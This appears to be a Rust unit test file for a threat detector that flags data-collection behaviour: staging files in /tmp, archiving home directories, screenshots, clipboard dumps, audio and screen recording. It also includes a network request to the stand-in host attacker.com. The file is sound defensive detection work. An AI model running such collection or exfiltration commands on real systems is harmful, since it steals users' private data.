//! Extended unit tests for Collection Analyzer
//!
//! Tests data gathering and collection pattern detection

use super::test_utils::*;
use threat_engine::analyzers::collection::CollectionAnalyzer;

// Data staging tests

#[test]
fn test_tmp_data_staging() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("mkdir /tmp/data && cp -r /home/user/docs /tmp/data"));
    assert_threat_above(&result, 75.0);
    assert_pattern_detected(&result, "staging");
}

#[test]
fn test_dev_shm_staging() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("cp sensitive.db /dev/shm/"));
    assert_threat_above(&result, 75.0);
}

#[test]
fn test_rsync_staging() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("rsync -av /home/user/secrets /tmp/staging/"));
    assert_threat_above(&result, 75.0);
}

// Archive creation tests

#[test]
fn test_tar_archive() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("tar -czf backup.tar.gz /home/user"));
    assert_threat_above(&result, 65.0);
    assert_pattern_detected(&result, "Archive");
}

#[test]
fn test_tar_with_tmp() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("tar -czvf /tmp/data.tar.gz /home/user/documents"));
    assert_threat_above(&result, 85.0);
}

#[test]
fn test_zip_archive() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("zip -r archive.zip /home/user/secrets"));
    assert_threat_above(&result, 65.0);
}

#[test]
fn test_7z_archive() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("7z a archive.7z /sensitive/data"));
    assert_threat_above(&result, 65.0);
}

#[test]
fn test_rar_archive() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("rar a backup.rar /data"));
    assert_threat_above(&result, 65.0);
}

// Screenshot capture tests

#[test]
fn test_scrot_screenshot() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("scrot screenshot.png"));
    assert_threat_above(&result, 80.0);
    assert_pattern_detected(&result, "Screenshot");
}

#[test]
fn test_gnome_screenshot() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("gnome-screenshot -f /tmp/screen.png"));
    assert_threat_above(&result, 80.0);
}

#[test]
fn test_screencapture_mac() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("screencapture -x screenshot.png"));
    assert_threat_above(&result, 80.0);
}

#[test]
fn test_imagemagick_import() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("import -window root screenshot.png"));
    assert_threat_above(&result, 80.0);
}

#[test]
fn test_xwd_capture() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("xwd -root > screen.xwd"));
    assert_threat_above(&result, 80.0);
}

// Clipboard access tests

#[test]
fn test_xclip_access() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("xclip -o > clipboard.txt"));
    assert_threat_above(&result, 70.0);
    assert_pattern_detected(&result, "Clipboard");
}

#[test]
fn test_xsel_access() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("xsel --clipboard --output"));
    assert_threat_above(&result, 70.0);
}

#[test]
fn test_pbpaste_mac() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("pbpaste > clipboard_content.txt"));
    assert_threat_above(&result, 70.0);
}

#[test]
fn test_powershell_clipboard() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("powershell -c Get-Clipboard"));
    assert_threat_above(&result, 70.0);
}

// Audio/video recording tests

#[test]
fn test_arecord_audio() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("arecord -d 60 recording.wav"));
    assert_threat_above(&result, 85.0);
    assert_pattern_detected(&result, "recording");
}

#[test]
fn test_sox_recording() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("sox -d recording.mp3 trim 0 60"));
    assert_threat_above(&result, 85.0);
}

#[test]
fn test_ffmpeg_recording() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("ffmpeg -f x11grab -i :0 screen.mp4"));
    assert_threat_above(&result, 85.0);
}

#[test]
fn test_recordmydesktop() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("recordmydesktop --no-sound -o screencast.ogv"));
    assert_threat_above(&result, 85.0);
}

// Safe operations

#[test]
fn test_safe_ls() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("ls -la"));
    assert_safe(&result);
}

#[test]
fn test_safe_cat() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("cat README.md"));
    assert_safe(&result);
}

#[test]
fn test_safe_git() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("git status"));
    assert_safe(&result);
}

#[test]
fn test_safe_npm() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("npm install"));
    assert_safe(&result);
}

// Edge cases

#[test]
fn test_empty_command() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call(""));
    assert_safe(&result);
}

#[test]
fn test_unicode_characters() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("echo '\u{1F4F8}' > emoji.txt"));
    assert_safe(&result);
}

#[test]
fn test_case_insensitive_tar() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("TAR -CZF backup.tar.gz /data"));
    assert_threat_above(&result, 65.0);
}

// Filesystem operations

#[test]
fn test_filesystem_staging_path() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&fs_write("/tmp/exfil/data.txt", "sensitive content"));
    assert_threat_above(&result, 75.0);
}

#[test]
fn test_filesystem_normal_write() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&fs_write("/home/user/project/output.txt", "normal content"));
    assert_safe(&result);
}

// Network operations

#[test]
fn test_network_staging_url() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&network_request("POST", "http://attacker.com/staging"));
    assert_threat_above(&result, 75.0);
}

// Database operations

#[test]
fn test_database_normal_query() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&db_query("SELECT * FROM users", "main"));
    assert_safe(&result);
}

// MITRE ATT&CK metadata

#[test]
fn test_mitre_metadata_present() {
    let analyzer = CollectionAnalyzer::new();
    let result = analyzer.analyze(&bash_call("tar -czf /tmp/data.tar.gz /home"));

    // Check that MITRE ATT&CK metadata is present
    let metadata = &result.metadata;
    assert!(metadata.get("mitre_attack").is_some());
}
